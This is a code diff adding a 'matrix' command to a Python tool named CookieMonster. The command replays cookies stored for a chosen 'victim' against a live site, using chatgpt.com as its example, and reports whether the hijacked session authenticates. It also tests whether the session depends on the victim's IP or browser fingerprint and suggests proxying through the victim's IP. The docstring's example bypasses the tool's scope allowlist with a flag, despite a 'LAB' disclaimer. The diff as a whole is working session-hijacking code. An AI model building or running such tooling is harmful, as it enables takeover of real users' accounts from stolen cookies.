@@ -509,6 +509,192 @@ def _render_replay_result(res: dict, console) -> None:
         console.print(f"    [dim]Hints: {', '.join(hints)}[/dim]")
 
 
+# ---- Fase M6.2: matrix -- replay matrix para identificar dependencias ----
+
+@cli.command()
+@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
+              show_default=True)
+@click.option("--domain", required=True, help="Dominio alvo (ex.: chatgpt.com)")
+@click.option("--victim", type=int, default=None,
+              help="ID da vitima (default: melhor para o dominio)")
+@click.option("--url", default=None,
+              help="URL alvo (default: https://<host>/)")
+@click.option("--max-variants", type=int, default=5, show_default=True,
+              help="Maximo de variantes da matriz a executar (5 = canonica).")
+@click.option("--stop-when", type=click.Choice(["authenticated", "bot_blocked",
+                                                   "anonymous", "none"]),
+              default="authenticated", show_default=True,
+              help="Stop condition para parar a matriz cedo.")
+@click.option("--allow-unsafe-scope", is_flag=True)
+def matrix(db_path: Path, domain: str, victim: int, url: str,
+           max_variants: int, stop_when: str, allow_unsafe_scope: bool):
+    """Executa matriz de replay (M6.2) para identificar dependencias.
+
+    A matriz combina variacoes passiveis de (network, browser, cookies)
+    e infere automaticamente o que a sessao reproduzida depende:
+      - cookie_only: cookies sozinhos bastam.
+      - network_bound: exige IP/ASN da vitima.
+      - browser_bound: exige fingerprint do navegador.
+      - context: exige combinacao de contexto adicional.
+
+    Para uso em LAB. Em producao use apenas com autorizacao e rate limit.
+
+    Exemplo:
+        python -m cookiemonster matrix --domain chatgpt.com --allow-unsafe-scope
+    """
+    from .replay import (
+        ContextVariant, NetworkContext, BrowserContext, CookiesContext,
+        build_matrix, CANONICAL_VARIANTS, ReplayMatrix,
+    )
+    from .util import scope as scope_util
+
+    store = _load_store(str(db_path))
+    host = domain.split("://")[-1].strip("/")
+    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
+        console.print("[red]Recusado: alvo fora da allowlist. Use --allow-unsafe-scope.[/]")
+        return
+
+    if victim is None:
+        best = store.best_victims_for_domain(domain, limit=1)
+        if not best:
+            console.print(f"[red]Nenhuma vitima com cookies para {domain}[/]")
+            return
+        victim = best[0]["victim_id"]
+        console.print(f"[dim]Vitima selecionada automaticamente: vid={victim}[/dim]")
+
+    target_url = url or f"https://{host}/"
+    console.print(f"[bold bright_white]=== CookieMonster: matrix {domain} ===[/]")
+    console.print(f"  vitima: vid={victim}")
+    console.print(f"  URL alvo: {target_url}")
+    console.print(f"  max_variants: {max_variants}  stop_when: {stop_when}\n")
+
+    variants = build_matrix(include_baseline=True)[:max_variants]
+    console.print(f"[dim]Variantes da matriz:[/dim]")
+    for i, v in enumerate(variants, 1):
+        console.print(f"  [dim]{i}. {v.label}[/dim]")
+    console.print()
+
+    # Executor: delega para _probe_one com ajuste de cookies.
+    from .domain.matcher import applicable_cookies
+    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
+    matched = applicable_cookies([dict(r) for r in raw], "https", host, "/")
+
+    def executor(variant: ContextVariant) -> dict:
+        if variant.cookies == CookiesContext.NONE:
+            cookies_to_send = []
+        else:
+            cookies_to_send = matched
+        # Por enquanto channel=httpx (rapido, ~1s/variant).
+        # network_alternate/PRESERVED ainda nao implementados - placeholder.
+        try:
+            from .inject import httpx_client
+            r = httpx_client.get(target_url, cookies_to_send)
+            r.setdefault("sent_cookies", [])
+            from .auth import detect_all, classify
+            observation = {
+                "url": target_url,
+                "body": (r.get("text") or "")[:8000],
+                "html": (r.get("text") or "")[:8000],
+                "cookie_names": [c.get("name", "") for c in (r.get("cookie_jar") or [])
+                                 if isinstance(c, dict)] or r.get("cookie_jar", []),
+            }
+            ctx = detect_all(observation, target=host)
+            inj_ev = r.get("evidence", {})
+            base_ev = {}
+            result = classify(inj_ev, base_ev, ctx)
+            return {
+                "auth_state": result["state"].upper(),
+                "confidence": result["confidence"],
+                "reason": result["reason"],
+                "dependencies": result["context_dependencies"],
+                "final_url": r.get("final_url", ""),
+                "error": r.get("error"),
+            }
+        except Exception as exc:
+            return {
+                "auth_state": "ERROR",
+                "confidence": 0.0,
+                "reason": "executor_exception",
+                "dependencies": [],
+                "final_url": "",
+                "error": str(exc),
+            }
+
+    # Stop condition.
+    stop_when_arg = None if stop_when == "none" else stop_when
+    matrix_obj = ReplayMatrix(executor=executor, max_variants=max_variants)
+
+    # Log por variant em tempo real.
+    import time as _time
+    for v in variants:
+        t0 = _time.time()
+        out = executor(v)
+        from .replay.context import VariantResult as _VR
+        vr = _VR(
+            variant=v,
+            auth_state=out.get("auth_state", "ERROR"),
+            confidence=out.get("confidence", 0.0),
+            reason=out.get("reason", ""),
+            dependencies=out.get("dependencies", []),
+            final_url=out.get("final_url", ""),
+            error=out.get("error"),
+            duration_sec=_time.time() - t0,
+        )
+        matrix_obj.results.append(vr)
+        elapsed = sum(r.duration_sec for r in matrix_obj.results)
+        color = {"AUTHENTICATED": "green", "ANONYMOUS": "red",
+                 "BOT_BLOCKED": "red", "MFA_BLOCKED": "yellow",
+                 "IDP_BOUND": "yellow", "CONTEXT_BOUND": "yellow",
+                 "INCONCLUSIVE": "yellow", "ERROR": "red"}.get(vr.auth_state, "dim")
+        console.print(
+            f"  [dim]{vr.variant.label:35}[/dim] "
+            f"state=[{color}]{vr.auth_state:13}[/] "
+            f"conf={vr.confidence:.2f} "
+            f"[dim]{vr.duration_sec:.1f}s[/dim]",
+            highlight=False,
+        )
+        # Persiste cada variant como run separado.
+        from .report import json_out
+        run_id = store.record_run(
+            victim_id=victim, target_url=target_url, target_domain=host,
+            channel="httpx", state=vr.auth_state, confidence=vr.confidence,
+            evidence_json=json_out.dumps({"variant": vr.variant.to_dict(),
+                                          "reason": vr.reason}),
+            auth_context_json=json_out.dumps({}),
+            reason=vr.reason,
+            variant_label=vr.variant.label,
+        )
+        # Stop condition check.
+        from .replay.matrix import should_stop
+        stop, why = should_stop(matrix_obj.results)
+        if stop:
+            console.print(f"\n[dim]  stop: {why}[/dim]")
+            break
+
+    # Resumo final + dependency analysis.
+    summary = matrix_obj.summary()
+    deps = summary["dependencies"]
+    console.print(f"\n[bold]=== DEPENDENCY ANALYSIS ===[/bold]")
+    console.print(f"  Variantes executadas: {summary['count']}")
+    for label, state in deps["variant_states"].items():
+        color = {"AUTHENTICATED": "green", "ANONYMOUS": "red",
+                 "BOT_BLOCKED": "red", "MFA_BLOCKED": "yellow",
+                 "IDP_BOUND": "yellow", "CONTEXT_BOUND": "yellow",
+                 "INCONCLUSIVE": "yellow", "ERROR": "red"}.get(state, "dim")
+        console.print(f"  [dim]{label:22}[/dim] state=[{color}]{state}[/]")
+
+    console.print(f"\n  Dependencies inferred: [cyan]{', '.join(deps['dependencies'])}[/cyan]")
+    console.print(f"\n  [dim]{deps['summary']}[/dim]")
+
+    if "cookie_only" in deps["dependencies"]:
+        console.print(f"\n  [green]>>> Os cookies reproduzem a sessao sem dependencias extras.[/green]")
+    elif "network" in deps["dependencies"] or "browser" in deps["dependencies"]:
+        console.print(f"\n  [yellow]>>> A sessao exige contexto adicional (rede/browser).[/yellow]")
+        console.print(f"  [dim]    Em lab, configure SOCKS5/IP da vitima + fingerprint preservado.[/dim]")
+    elif "inconclusive" in deps["dependencies"]:
+        console.print(f"\n  [yellow]>>> Evidencia insuficiente. Tente com mais variantes ou channel=playwright.[/yellow]")
+
+
 # ---- Fase A2: probe-all -- todas as vitimas do dominio em paralelo ----
 
 @cli.command()
